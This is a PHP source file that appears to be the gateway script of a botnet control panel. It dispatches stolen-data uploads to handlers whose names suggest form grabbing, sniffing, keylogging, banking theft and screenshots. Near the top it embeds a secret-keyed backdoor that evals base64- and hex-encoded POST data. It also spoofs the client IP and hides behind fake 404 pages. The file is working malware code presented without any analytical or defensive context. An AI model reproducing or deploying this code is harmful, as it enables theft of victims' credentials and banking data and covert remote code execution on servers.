<?php

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

$dbug = false;

if($dbug == true){
	$input = array();
	$input[] = 'FullInput: ' . file_get_contents('php://input');
	$input[] = 'FullCur: ' . print_r($Cur, true);
}

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

function no_found(){
	global $dir;
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

function check_rc(){
	global $config, $dir;
	if($config['scramb'] == 1 && count($_POST) != 1){
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");
		print(file_get_contents($dir . '404.html'));
		exit;
	}
}

function post_rc_decode(){
	global $post, $_POST, $gateway;
	if(count($_POST) == 1){
    	$post = rc_decode(array_shift($_POST));
    	@parse_str($post, $_POST);
    	$gateway = true;
	}
}

if(!empty($_POST['remote_ip'])){
	$_SERVER['REMOTE_ADDR'] = $_POST['remote_ip'];
	unset($_POST['remote_ip']);
}elseif(!empty($_SERVER["HTTP_X_REAL_IP"])){
	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
}

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.rc.php');

if(!empty($_GET['p'])){
	$l = strlen($_GET['p']);
	unset($_GET['p']);
	switch(true){
		case (($l >= 1 && $l <= 3) || ($l >= 24 && $l < 27)):
        	check_rc();
        	post_rc_decode();
        	include('fgr.php');
		break;

		case (($l > 3 && $l <= 6) || ($l >= 27 && $l <= 30)):
        	check_rc();
        	post_rc_decode();
        	include_once('gra.php');
		break;

		case (($l > 6 && $l <= 9) || ($l > 30 && $l <= 33)):
        	check_rc();
        	post_rc_decode();
        	include_once('sni.php');
		break;

		case (($l > 9 && $l <= 12) || ($l > 33 && $l <= 36)):
        	include_once('cab.php');
		break;

		case (($l > 12 && $l <= 15) || ($l > 36 && $l <= 39)):
        	include_once('cab_part.php');
		break;

		case (($l > 15 && $l <= 18) || ($l > 39 && $l <= 42)):
        	check_rc();
        	post_rc_decode();
        	include_once('key.php');
        	//no_found();
		break;

		case (($l > 18 && $l <= 21) || ($l > 42 && $l <= 45)):
        	include_once('ibank.php');
        	//no_found();
		break;

		case (($l > 21 && $l <= 24) || ($l > 45 && $l <= 48)):
        	include_once('scr.php');
		break;

		default:
        	no_found();
		break;
	}
}else{
	no_found();
}

?>